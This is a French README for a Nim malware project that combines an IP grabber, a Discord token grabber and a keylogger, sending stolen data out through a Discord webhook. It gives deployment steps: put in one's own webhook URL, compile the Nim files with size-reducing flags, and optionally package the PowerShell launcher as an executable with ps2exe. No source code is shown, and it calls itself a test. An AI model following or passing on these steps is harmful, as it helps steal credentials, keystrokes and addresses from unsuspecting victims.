# chat-perdu
### un chat s'est perdu sur votre ordinateur...

un ip grabber + token grabber + keylogger via un discord webhook, fait en nim
(cela est un test et utilise du code de [OffensiveNim](https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/keylogger_bin.nim) et [NimGrabber](https://github.com/NullCode1337/NimGrabber/blob/main/grabber.nim)

prérequis:
  - [nim 1.6.10](https://nim-lang.org/)
  - (optionelle) [ps2exe](https://github.com/MScholtes/PS2EXE)
  
étapes à suivre:
  - éditez le fichier webhook.nim avec l'url de votre webhook discord
  - compiler logs.nim et webhook.nim en utilisant les commandes suivantes : nim c --deadCodeElim:on --opt:size --stackTrace:off --lineTrace:off --gc:none logs.nim, et : nim c --deadCodeElim:on --opt:size --stackTrace:off --lineTrace:off --gc:none webhook.nim
  - (optionelle) convertir le fichier powershell en utilisant ps2exe en utilisant cette commande : Invoke-ps2exe .\main.ps1 .\main.exe, ou : Win-PS2EXE, si vous souhaitez une interface gui.
